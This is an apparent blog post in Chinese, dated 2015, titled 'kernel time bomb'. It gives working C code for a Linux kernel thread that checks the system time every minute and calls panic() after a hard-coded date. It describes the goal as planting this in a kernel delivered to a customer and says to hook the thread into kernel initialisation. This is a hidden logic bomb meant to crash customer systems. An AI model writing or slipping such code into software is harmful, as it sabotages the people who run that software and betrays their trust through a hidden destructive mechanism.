title: "kernel定时炸弹"
date: 2015-04-03 08:59:17
tags: [kernel]
---

这个需求很bt，在内核中给客户埋一个定时炸弹。在适当的时间段，检测系统时间，如果发现当前时间已经是某一天，boom，核心panic。

<!-- more -->

为了实现这个需求，我们需要一个简单的核心线程。简单实例如下：

``` c
#include <linux/freezer.h>
#include <linux/kthread.h>


struct task_struct * ktimerd;
static DECLARE_WAIT_QUEUE_HEAD(ktimerd_wait);

static int ktimerd_kthread(void *none) {
   struct timeval tv;
   unsigned long maxtime = mktime(2015, 4, 3, 9, 47, 0);
   while (1) {
      wait_event_freezable_timeout(ktimerd_wait, false,
        msecs_to_jiffies(60000));
      do_gettimeofday(&tv);
      if(tv.tv_sec > maxtime)
         panic("kernel timer bomb\n");
   }
} 
```

在另外的地方执行，确保在内核初始化代码中调用到即可。

``` c
ktimerd = kthread_run(ktimerd_kthread, NULL,"ktimerd");
```

可以根据需要调整`wait_event_freezable_timeout`中的时间间隔，和`mktime`中的年月日时分秒。
